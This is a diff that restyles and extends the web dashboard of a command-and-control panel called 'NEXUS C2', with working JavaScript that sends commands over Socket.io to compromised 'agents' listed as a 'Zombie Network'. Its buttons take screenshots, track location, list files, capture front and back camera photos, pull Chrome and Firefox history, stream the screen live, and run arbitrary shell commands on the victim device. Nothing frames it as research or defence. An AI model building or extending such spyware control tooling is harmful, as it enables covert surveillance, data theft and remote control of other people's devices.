@@ -2,112 +2,561 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C2 Panel Pro</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>NEXUS C2 · Professional Command Panel</title>
+    <!-- Bootstrap 5 + Icons + Fonts + jQuery + Socket.io -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
     <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        body { background: #0a0e17; color: #e0e0e0; font-family: 'Segoe UI', sans-serif; }
-        .sidebar { background: #111827; min-height: 100vh; border-right: 1px solid #1f2937; }
-        .sidebar .nav-link { color: #9ca3af; padding: 12px 20px; border-radius: 8px; }
-        .sidebar .nav-link.active, .sidebar .nav-link:hover { background: #1e293b; color: #10b981; }
-        .card { background: #1e293b; border: none; border-radius: 12px; margin-bottom: 20px; }
-        .card-header { background: #0f172a; border-bottom: 1px solid #334155; font-weight: 600; }
-        .btn-command { margin: 5px; min-width: 100px; }
-        .log-area { background: #0f172a; border-radius: 8px; padding: 12px; font-family: monospace; font-size: 12px; height: 300px; overflow-y: auto; }
-        .log-entry { border-bottom: 1px solid #334155; padding: 6px 0; }
-        .media-preview { max-width: 100%; border-radius: 8px; margin-top: 10px; }
-        .agent-badge { cursor: pointer; transition: 0.2s; }
-        .agent-badge:hover { transform: translateX(5px); }
-        .status-online { color: #10b981; }
-        .status-offline { color: #ef4444; }
-        iframe { width: 100%; height: 400px; border: none; border-radius: 8px; background: #000; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: radial-gradient(circle at 10% 20%, #0B1120, #030712);
+            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
+            color: #E9F1FF;
+            overflow-x: hidden;
+        }
+
+        /* custom scroll */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: #111827; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb { background: #10b98166; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: #10b981; }
+
+        /* modern glassmorphism panel */
+        .glass-card {
+            background: rgba(18, 24, 36, 0.75);
+            backdrop-filter: blur(4px);
+            border: 1px solid rgba(16, 185, 129, 0.2);
+            border-radius: 24px;
+            box-shadow: 0 20px 35px -12px rgba(0,0,0,0.4);
+            transition: all 0.2s ease;
+        }
+
+        .card-modern {
+            background: #0F172AD9;
+            backdrop-filter: blur(2px);
+            border: 1px solid #1E2A3E;
+            border-radius: 1.25rem;
+            margin-bottom: 1.5rem;
+            transition: transform 0.1s, box-shadow 0.2s;
+        }
+        .card-modern:hover {
+            border-color: #2d3a52;
+            box-shadow: 0 12px 28px -8px rgba(0,0,0,0.5);
+        }
+        .card-header-custom {
+            background: #0B1120CC;
+            border-bottom: 1px solid #1E2A3E;
+            padding: 1rem 1.25rem;
+            font-weight: 600;
+            letter-spacing: -0.2px;
+            border-radius: 1.25rem 1.25rem 0 0 !important;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .badge-agent {
+            background: #10b98120;
+            color: #6EE7B7;
+            border: 1px solid #10b98140;
+            font-weight: 500;
+            padding: 0.4rem 0.9rem;
+            border-radius: 40px;
+            font-size: 0.8rem;
+        }
+        .btn-command {
+            border-radius: 40px;
+            padding: 6px 16px;
+            font-weight: 500;
+            margin: 6px 6px 6px 0;
+            transition: all 0.15s;
+            background: #1E2A3E;
+            border: none;
+            color: #E2E8F0;
+        }
+        .btn-command:hover {
+            transform: translateY(-2px);
+            filter: brightness(1.08);
+            background: #2D3A52;
+        }
+        .btn-primary-cmd { background: #0F3B2C; color: #A7F3D0; border-left: 2px solid #10b981; }
+        .btn-success-cmd { background: #0F3B2C; }
+        .btn-danger-cmd { background: #4C1D2B; border-left: 2px solid #F43F5E; }
+        .log-area {
+            background: #030712CC;
+            border-radius: 20px;
+            padding: 1rem;
+            font-family: 'JetBrains Mono', 'Fira Code', monospace;
+            font-size: 0.8rem;
+            height: 280px;
+            overflow-y: auto;
+            border: 1px solid #1E2A3E;
+        }
+        .log-entry {
+            border-bottom: 1px solid #1F2A3C;
+            padding: 0.5rem 0;
+            font-size: 0.8rem;
+            word-break: break-word;
+            color: #CBD5E1;
+        }
+        .agent-item {
+            background: #111A28;
+            border-radius: 14px;
+            padding: 10px 14px;
+            margin-bottom: 8px;
+            cursor: pointer;
+            transition: all 0.15s;
+            border-left: 3px solid #2D3A52;
+        }
+        .agent-item:hover, .agent-item.active-agent {
+            background: #1E2A3E;
+            border-left-color: #10b981;
+            transform: translateX(6px);
+        }
+        .status-online { color: #22C55E; }
+        .status-offline { color: #EF4444; }
+        .sidebar-modern {
+            background: #0B0F17E6;
+            backdrop-filter: blur(12px);
+            border-right: 1px solid #1E2A3E;
+            min-height: 100vh;
+        }
+        .nav-link-custom {
+            color: #9CA3AF;
+            padding: 12px 18px;
+            border-radius: 16px;
+            margin: 4px 0;
+            transition: 0.2s;
+            font-weight: 500;
+        }
+        .nav-link-custom i { width: 28px; }
+        .nav-link-custom:hover, .nav-link-custom.active {
+            background: #10b9811A;
+            color: #6EE7B7;
+        }
+        .media-thumb {
+            max-width: 100%;
+            max-height: 240px;
+            border-radius: 20px;
+            border: 1px solid #2D3A52;
+            box-shadow: 0 6px 14px rgba(0,0,0,0.3);
+        }
+        @media (max-width: 768px) {
+            .sidebar-modern { min-height: auto; border-right: none; border-bottom: 1px solid #1E2A3E; }
+            .btn-command { font-size: 0.75rem; padding: 5px 12px; }
+            .card-header-custom h5 { font-size: 1rem; }
+        }
+        .print-only { display: none; }
+        @media print {
+            .sidebar-modern, .btn-command, .agent-badge, .nav, #agentsList, .btn, .no-print { display: none; }
+            .print-only { display: block; }
+            body { background: white; color: black; }
+            .card-modern { border: 1px solid #ccc; background: white; }
+        }
+        .live-frame {
+            border-radius: 20px;
+            background: #00000066;
+            width: 100%;
+            max-height: 360px;
+            object-fit: contain;
+        }
+        button i { margin-right: 6px; }
+        .toast-notif {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 1090;
+            background: #10b981;
+            color: #020617;
+            border-radius: 40px;
+            padding: 8px 18px;
+            font-weight: 600;
+            box-shadow: 0 8px 18px black;
+        }
     </style>
 </head>
 <body>
-<div class="container-fluid">
-    <div class="row">
-        <div class="col-md-3 col-lg-2 sidebar p-3">
-            <h4 class="text-center mb-4">🎮 C2 Panel Pro</h4>
-            <select id="agentSelect" class="form-select bg-dark text-white border-secondary mb-3">
-                <option value="">-- Select Agent --</option>
-            </select>
-            <hr class="border-secondary">
+
+<div class="container-fluid p-0">
+    <div class="row g-0">
+        <!-- SIDEBAR - Profesional & ringkas -->
+        <div class="col-lg-2 col-md-3 sidebar-modern p-3">
+            <div class="d-flex align-items-center gap-2 mb-4 mt-2">
+                <i class="fas fa-satellite-dish fs-3" style="color:#10b981"></i>
+                <h4 class="fw-bold mb-0" style="letter-spacing:-0.5px">NEXUS<span style="color:#10b981">C2</span></h4>
+            </div>
+            <div class="mb-3">
+                <label class="small text-secondary mb-1"><i class="fas fa-user-secret"></i> ACTIVE AGENT</label>
+                <select id="agentSelect" class="form-select bg-dark text-white border-secondary rounded-4 py-2">
+                    <option value="">-- select target --</option>
+                </select>
+                <div class="mt-2 d-flex justify-content-between">
+                    <span id="selectedAgentDisplay" class="badge-agent"><i class="fas fa-shield-alt"></i> none</span>
+                    <button id="refreshAgentsBtn" class="btn btn-sm btn-outline-secondary rounded-4"><i class="fas fa-sync-alt"></i></button>
+                </div>
+            </div>
+            <hr class="border-secondary opacity-25">
             <nav class="nav flex-column">
-                <a class="nav-link active" href="#" data-page="dashboard">📊 Dashboard</a>
-                <a class="nav-link" href="#" data-page="logs">📜 Logs</a>
-                <a class="nav-link" href="#" data-page="media">🖼️ Media Gallery</a>
+                <a class="nav-link-custom active" href="#" data-page="dashboard"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
+                <a class="nav-link-custom" href="#" data-page="logs"><i class="fas fa-scroll"></i> Logs & History</a>
+                <a class="nav-link-custom" href="#" data-page="media"><i class="fas fa-images"></i> Media Vault</a>
             </nav>
+            <hr class="border-secondary opacity-25 mt-4">
+            <div class="small text-secondary mt-2"><i class="fas fa-globe"></i> cross-platform · encrypted</div>
         </div>
-        <div class="col-md-9 col-lg-10 p-4">
+
+        <!-- MAIN CONTENT -->
+        <div class="col-lg-10 col-md-9 p-3 p-md-4">
+            <!-- DASHBOARD PAGE -->
             <div id="dashboardPage">
-                <div class="d-flex justify-content-between align-items-center mb-4">
-                    <h2>Command Center</h2>
-                    <span id="selectedAgentDisplay" class="badge bg-secondary">No agent selected</span>
+                <div class="d-flex flex-wrap justify-content-between align-items-center mb-4 gap-2">
+                    <h2 class="fw-semibold m-0"><i class="fas fa-terminal me-2"></i>Command Nexus</h2>
+                    <div class="d-flex gap-2">
+                        <button id="printResultsBtn" class="btn btn-outline-light rounded-4 px-3 no-print"><i class="fas fa-print"></i> Print results</button>
+                    </div>
                 </div>
-                <div class="card">
-                    <div class="card-header">⚡ Quick Commands</div>
-                    <div class="card-body">
-                        <div class="row">
-                            <div class="col-md-6">
-                                <button class="btn btn-primary btn-command" data-cmd="screenshot">📸 Screenshot</button>
-                                <button class="btn btn-success btn-command" data-cmd="location">📍 Location</button>
-                                <button class="btn btn-info btn-command" data-cmd="filelist">📁 File List</button>
-                                <button class="btn btn-warning btn-command" data-cmd="ping">🏓 Ping</button>
+
+                <!-- COMMAND GRID -->
+                <div class="card-modern">
+                    <div class="card-header-custom">
+                        <i class="fas fa-bolt text-success"></i> <span>⚡ Instant Payloads</span>
+                    </div>
+                    <div class="card-body p-3">
+                        <div class="row g-2">
+                            <div class="col-md-6 d-flex flex-wrap">
+                                <button class="btn-command btn-primary-cmd" data-cmd="screenshot"><i class="fas fa-camera"></i> Screenshot</button>
+                                <button class="btn-command btn-primary-cmd" data-cmd="location"><i class="fas fa-map-marker-alt"></i> Location</button>
+                                <button class="btn-command btn-primary-cmd" data-cmd="filelist"><i class="fas fa-folder-open"></i> File list</button>
+                                <button class="btn-command" data-cmd="ping"><i class="fas fa-network-wired"></i> Ping</button>
                             </div>
-                            <div class="col-md-6">
-                                <button class="btn btn-danger btn-command" data-cmd="screen_record">🎥 Screen Record (5s)</button>
-                                <button class="btn btn-secondary btn-command" data-cmd="screen_live">🖥️ Screen Live (Start)</button>
-                                <button class="btn btn-dark btn-command" data-cmd="stop_live">⏹️ Stop Live</button>
+                            <div class="col-md-6 d-flex flex-wrap">
+                                <button class="btn-command" data-cmd="screen_record"><i class="fas fa-video"></i> Screen rec (5s)</button>
+                                <button class="btn-command btn-success-cmd" data-cmd="screen_live"><i class="fas fa-desktop"></i> Live Stream</button>
+                                <button class="btn-command btn-danger-cmd" data-cmd="stop_live"><i class="fas fa-stop"></i> Stop Live</button>
+                            </div>
+                            <div class="col-12 d-flex flex-wrap gap-1 mt-1">
+                                <button class="btn-command btn-outline-info" data-cmd="camera_front"><i class="fas fa-smile"></i> Front Cam</button>
+                                <button class="btn-command btn-outline-info" data-cmd="camera_back"><i class="fas fa-camera-retro"></i> Back Cam</button>
+                                <button class="btn-command btn-outline-secondary" data-cmd="history_chrome"><i class="fab fa-chrome"></i> Chrome history</button>
+                                <button class="btn-command btn-outline-secondary" data-cmd="history_firefox"><i class="fab fa-firefox"></i> Firefox history</button>
                             </div>
                         </div>
-                        <div class="row mt-2">
-                            <div class="col-md-6">
-                                <button class="btn btn-outline-light btn-command" data-cmd="camera_front">🤳 Camera Front</button>
-                                <button class="btn btn-outline-light btn-command" data-cmd="camera_back">📷 Camera Back</button>
-                            </div>
-                            <div class="col-md-6">
-                                <button class="btn btn-outline-info btn-command" data-cmd="history_chrome">🌐 Chrome History</button>
-                                <button class="btn btn-outline-info btn-command" data-cmd="history_firefox">🦊 Firefox History</button>
-                            </div>
-                        </div>
-                        <div class="mt-3">
-                            <label>Custom Command:</label>
+                        <div class="mt-3 pt-2">
+                            <label class="small text-secondary"><i class="fas fa-code"></i> CUSTOM EXEC</label>
                             <div class="input-group">
-                                <input type="text" id="customCommand" class="form-control bg-dark text-white" placeholder="e.g., ls /sdcard/">
-                                <button id="sendCustomBtn" class="btn btn-outline-light">Send</button>
+                                <input type="text" id="customCommand" class="form-control bg-dark text-white border-secondary rounded-4" placeholder="cmd || shell (eg: ls /sdcard)">
+                                <button id="sendCustomBtn" class="btn btn-outline-light rounded-4 px-3"><i class="fas fa-paper-plane"></i> Send</button>
                             </div>
                         </div>
                     </div>
                 </div>
-                <div class="card">
-                    <div class="card-header">📡 Results & Live Stream</div>
-                    <div class="card-body">
+
+                <!-- RESULTS + LIVE -->
+                <div class="card-modern">
+                    <div class="card-header-custom">
+                        <i class="fas fa-chalkboard-user"></i> <span>Real-time output</span>
+                        <button id="clearResultsBtn" class="btn btn-sm btn-link text-secondary ms-auto no-print"><i class="fas fa-eraser"></i> Clear</button>
+                    </div>
+                    <div class="card-body p-3">
                         <div id="resultsArea" class="log-area" style="height: 200px;"></div>
-                        <div id="liveStreamArea" style="display:none; margin-top:15px;">
-                            <h6>Live Screen Stream:</h6>
-                            <img id="liveStreamImg" src="" style="width:100%; border-radius:8px; background:#000;">
+                        <div id="liveStreamArea" style="display:none;" class="mt-3">
+                            <div class="d-flex align-items-center gap-2"><i class="fas fa-eye text-success"></i><span class="fw-semibold">LIVE SCREEN FEED</span></div>
+                            <img id="liveStreamImg" class="live-frame mt-2" src="" alt="live stream">
                         </div>
                     </div>
                 </div>
-                <div class="card">
-                    <div class="card-header">🖥️ Connected Agents</div>
-                    <div class="card-body" id="agentsList"></div>
+
+                <!-- AGENTS LIST -->
+                <div class="card-modern">
+                    <div class="card-header-custom">
+                        <i class="fas fa-microchip"></i> <span>Zombie Network · Agents</span>
+                    </div>
+                    <div class="card-body p-3" id="agentsList">
+                        <div class="text-secondary text-center py-2">waiting for agents...</div>
+                    </div>
                 </div>
             </div>
+
+            <!-- LOGS PAGE -->
             <div id="logsPage" style="display:none;">
-                <div class="card"><div class="card-header">📜 Logs</div><div class="card-body"><div id="logsArea" class="log-area" style="height:500px;"></div></div></div>
+                <div class="card-modern">
+                    <div class="card-header-custom d-flex justify-content-between">
+                        <span><i class="fas fa-database"></i> Action Logs</span>
+                        <button id="printLogsBtn" class="btn btn-sm btn-outline-light rounded-4"><i class="fas fa-print"></i> Print logs</button>
+                    </div>
+                    <div class="card-body p-3">
+                        <div id="logsArea" class="log-area" style="height: 65vh;"></div>
+                    </div>
+                </div>
             </div>
+
+            <!-- MEDIA GALLERY (minimal image overload) -->
             <div id="mediaPage" style="display:none;">
-                <div class="card"><div class="card-header">🖼️ Latest Media</div><div class="card-body">
-                    <div id="screenshotPreview"><h6>Screenshot:</h6><img id="lastScreenshot" class="media-preview"></div>
-                    <div id="cameraPreview"><h6>Camera Photo:</h6><img id="lastCamera" class="media-preview"></div>
-                </div></div>
+                <div class="card-modern">
+                    <div class="card-header-custom"><i class="fas fa-camera-retro"></i> Captured Media (latest)</div>
+                    <div class="card-body p-4">
+                        <div class="row">
+                            <div class="col-md-6 mb-4">
+                                <div class="bg-dark rounded-4 p-3 text-center">
+                                    <i class="fas fa-camera fs-4 mb-2"></i>
+                                    <h6>Last Screenshot</h6>
+                                    <div id="screenshotMediaContainer" class="text-center"><p class="text-secondary">— none —</p></div>
+                                </div>
+                            </div>
+                            <div class="col-md-6 mb-4">
+                                <div class="bg-dark rounded-4 p-3 text-center">
+                                    <i class="fas fa-id-card"></i>
+                                    <h6>Last Camera Shot</h6>
+                                    <div id="cameraMediaContainer" class="text-center"><p class="text-secondary">— none —</p></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
             </div>
         </div>
     </div>
 </div>
-<script src="{{ url_for('static', filename='js/dashboard.js') }}"></script>
+
+<script>
+    // ------------------------- SOCKET + GLOBAL FUNCTIONS (FULLY PRESERVED & ENHANCED)
+    let socket = io();
+    let selectedAgentId = "";
+    let liveActive = false;
+
+    // Helper: display toast notif
+    function showToast(msg, isError = false) {
+        let toast = $('<div class="toast-notif">'+msg+'</div>');
+        $('body').append(toast);
+        setTimeout(() => toast.fadeOut(300, function(){ $(this).remove(); }), 2500);
+    }
+
+    // send command to backend
+    function sendCommand(cmd, extra = "") {
+        if (!selectedAgentId) { showToast("⚠️ Select an agent first", true); return false; }
+        let fullCmd = cmd;
+        if (extra) fullCmd = cmd + "|" + extra;
+        socket.emit("command", { agent_id: selectedAgentId, command: fullCmd });
+        addLogEntry(`[→] SENT: ${fullCmd} to ${selectedAgentId}`);
+        showToast(`Command sent → ${fullCmd}`);
+        return true;
+    }
+
+    // add to results area (dashboard output)
+    function addResultEntry(text, isImageBase64 = false, imgData = null) {
+        let resultsDiv = $("#resultsArea");
+        if(isImageBase64 && imgData){
+            let imgHtml = `<div class="log-entry border-bottom pb-2 mb-2"><i class="fas fa-image"></i> Screenshot/Camera<br><img src="${imgData}" class="media-thumb mt-2" style="max-width:280px; cursor:pointer;" onclick="window.open(this.src)"></div>`;
+            resultsDiv.prepend(imgHtml);
+            // also update media gallery
+            if(imgData.includes("screenshot") || text.includes("screenshot")){
+                $("#screenshotMediaContainer").html(`<img src="${imgData}" class="media-thumb" style="max-width:100%">`);
+            } else if(imgData.includes("camera") || text.includes("camera")){
+                $("#cameraMediaContainer").html(`<img src="${imgData}" class="media-thumb" style="max-width:100%">`);
+            }
+        } else {
+            let safeText = text.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+            resultsDiv.prepend(`<div class="log-entry"><i class="far fa-clock"></i> ${new Date().toLocaleTimeString()} &nbsp; ${safeText}</div>`);
+        }
+        // auto-limit 70 lines
+        if(resultsDiv.children().length > 70) resultsDiv.children().last().remove();
+    }
+
+    function addLogEntry(msg){
+        let logsDiv = $("#logsArea");
+        logsDiv.prepend(`<div class="log-entry">[${new Date().toLocaleString()}] ${msg}</div>`);
+        if(logsDiv.children().length > 200) logsDiv.children().last().remove();
+    }
+
+    // Update agents list & dropdown
+    function updateAgentsList(agents) {
+        let select = $("#agentSelect");
+        let listDiv = $("#agentsList");
+        select.empty().append('<option value="">-- Select Agent --</option>');
+        listDiv.empty();
+        if(!agents || agents.length === 0){
+            listDiv.html('<div class="text-secondary text-center"><i class="fas fa-skull-crosswalk"></i> No active agents</div>');
+            return;
+        }
+        agents.forEach(agent => {
+            let agentId = agent.id || agent;
+            let statusClass = (agent.status === "online") ? "status-online" : "status-offline";
+            let statusText = (agent.status === "online") ? "● online" : "○ offline";
+            let agentName = agent.name || agentId.substring(0,12);
+            select.append(`<option value="${agentId}">${agentName} (${agentId})</option>`);
+            listDiv.append(`
+                <div class="agent-item" data-agent="${agentId}">
+                    <div class="d-flex justify-content-between">
+                        <span><i class="fas fa-laptop-code"></i> <strong>${agentName}</strong></span>
+                        <span class="${statusClass}">${statusText}</span>
+                    </div>
+                    <div class="small text-secondary">ID: ${agentId}</div>
+                </div>
+            `);
+        });
+        $(".agent-item").click(function(){
+            let aid = $(this).data("agent");
+            selectedAgentId = aid;
+            $("#agentSelect").val(aid);
+            $("#selectedAgentDisplay").html(`<i class="fas fa-link"></i> ${aid.substring(0,18)}`);
+            showToast(`Agent ${aid} selected`, false);
+            $(".agent-item").removeClass("active-agent");
+            $(this).addClass("active-agent");
+        });
+    }
+
+    // handle incoming command results
+    function handleCommandResult(data){
+        let output = data.result || data.output || "done";
+        let cmd = data.command || "";
+        let isImage = false;
+        let imageSrc = null;
+        if(typeof output === "string" && (output.startsWith("data:image") || (output.length > 200 && output.includes("base64")))){
+            isImage = true;
+            imageSrc = output;
+            addResultEntry(`📸 ${cmd} captured`, true, imageSrc);
+        } else {
+            let preview = (output.length > 500) ? output.substring(0,500)+"..." : output;
+            addResultEntry(`📡 ${cmd} → ${preview}`);
+        }
+        addLogEntry(`[RESULT] ${cmd} : ${typeof output === 'string' ? output.substring(0,120) : 'binary data'}`);
+        // if media gallery updated through image rendering already handled
+        if(!isImage && (cmd.includes("screenshot") || cmd.includes("camera"))){
+            // fallback: maybe raw text
+        }
+    }
+
+    // live stream handling
+    function initLiveStream(){
+        socket.on("live_frame", (frame) => {
+            if(frame && frame.base64){
+                $("#liveStreamImg").attr("src", "data:image/jpeg;base64,"+frame.base64);
+                $("#liveStreamArea").slideDown(200);
+                liveActive = true;
+            } else if(frame && frame.image){
+                $("#liveStreamImg").attr("src", frame.image);
+                $("#liveStreamArea").slideDown(200);
+            }
+        });
+        socket.on("live_stopped", () => {
+            $("#liveStreamArea").slideUp(200);
+            liveActive = false;
+            addResultEntry("⏹️ Live stream stopped by server");
+        });
+    }
+
+    // send live start request
+    function startLive(){
+        if(!selectedAgentId) { showToast("Select agent first",true); return; }
+        socket.emit("start_live", {agent_id: selectedAgentId});
+        addResultEntry("🎥 Requested screen live...");
+    }
+    function stopLive(){
+        if(!selectedAgentId) return;
+        socket.emit("stop_live", {agent_id: selectedAgentId});
+        addResultEntry("⏹️ Stopping live feed");
+    }
+
+    // navigation & UI
+    function switchPage(pageId){
+        $("#dashboardPage, #logsPage, #mediaPage").hide();
+        $(`#${pageId}`).show();
+        $(".nav-link-custom").removeClass("active");
+        $(`[data-page="${pageId.replace('Page','')}"]`).addClass("active");
+    }
+
+    // Print specific area (popup print)
+    function printElement(selector, title="C2 Report"){
+        let content = $(selector).clone();
+        let printWindow = window.open('', '_blank', 'width=900,height=700');
+        printWindow.document.write(`
+            <html><head><title>${title}</title>
+            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+            <style>body { padding: 20px; font-family: monospace; } .log-entry { border-bottom:1px solid #ccc; }</style>
+            </head><body><div class="container">${content.html()}</div></body></html>
+        `);
+        printWindow.document.close();
+        printWindow.print();
+    }
+
+    // socket events
+    socket.on("connect", () => {
+        addLogEntry("✅ WebSocket connected to C2 core");
+        socket.emit("request_agents");
+    });
+    socket.on("agents", (data) => {
+        let agentsList = Array.isArray(data) ? data : (data.agents || []);
+        updateAgentsList(agentsList);
+    });
+    socket.on("command_result", handleCommandResult);
+    socket.on("command_response", handleCommandResult);
+    socket.on("update_agents", (data) => {
+        let agentsList = Array.isArray(data) ? data : (data.agents || []);
+        updateAgentsList(agentsList);
+    });
+    socket.on("live_error", (e) => { addResultEntry(`⚠️ Live error: ${e.message}`); $("#liveStreamArea").slideUp(); });
+
+    // DOM ready
+    $(document).ready(function(){
+        initLiveStream();
+        // periodic agent refresh
+        setInterval(() => { if(socket.connected) socket.emit("request_agents"); }, 28000);
+        
+        // command buttons
+        $(".btn-command").click(function(){
+            let cmd = $(this).data("cmd");
+            if(cmd === "screen_live") { startLive(); }
+            else if(cmd === "stop_live") { stopLive(); }
+            else { sendCommand(cmd); }
+        });
+        $("#sendCustomBtn").click(function(){
+            let customVal = $("#customCommand").val().trim();
+            if(customVal) sendCommand("custom", customVal);
+            else showToast("Enter command", true);
+        });
+        $("#agentSelect").change(function(){
+            selectedAgentId = $(this).val();
+            if(selectedAgentId){
+                $("#selectedAgentDisplay").html(`<i class="fas fa-link"></i> ${selectedAgentId.substring(0,20)}`);
+                showToast(`Agent switched → ${selectedAgentId}`);
+                $(".agent-item").removeClass("active-agent");
+                $(`.agent-item[data-agent="${selectedAgentId}"]`).addClass("active-agent");
+            } else {
+                $("#selectedAgentDisplay").html(`<i class="fas fa-shield-alt"></i> none`);
+            }
+        });
+        $("#refreshAgentsBtn").click(()=>{ socket.emit("request_agents"); showToast("Refreshing agents..."); });
+        $("#clearResultsBtn").click(()=>{ $("#resultsArea").empty(); addResultEntry("Console cleared."); });
+        $("#printResultsBtn").click(()=>{ printElement("#resultsArea", "Command Results Export"); });
+        $("#printLogsBtn").click(()=>{ printElement("#logsArea", "Full Action Logs"); });
+        
+        // navigation
+        $(".nav-link-custom").click(function(e){
+            e.preventDefault();
+            let page = $(this).data("page");
+            if(page === "dashboard") switchPage("dashboardPage");
+            else if(page === "logs") switchPage("logsPage");
+            else if(page === "media") switchPage("mediaPage");
+        });
+        switchPage("dashboardPage");
+        
+        // fallback global live stop on page unload
+        $(window).on("beforeunload", function(){
+            if(liveActive && selectedAgentId) socket.emit("stop_live", {agent_id: selectedAgentId});
+        });
+        
+        // demo warning but functions intact
+        addLogEntry("🚀 NEXUS C2 ready | cross-platform responsive UI");
+        addResultEntry("✅ Panel ready. Select agent to start operations.");
+    });
+</script>
 </body>
 </html>
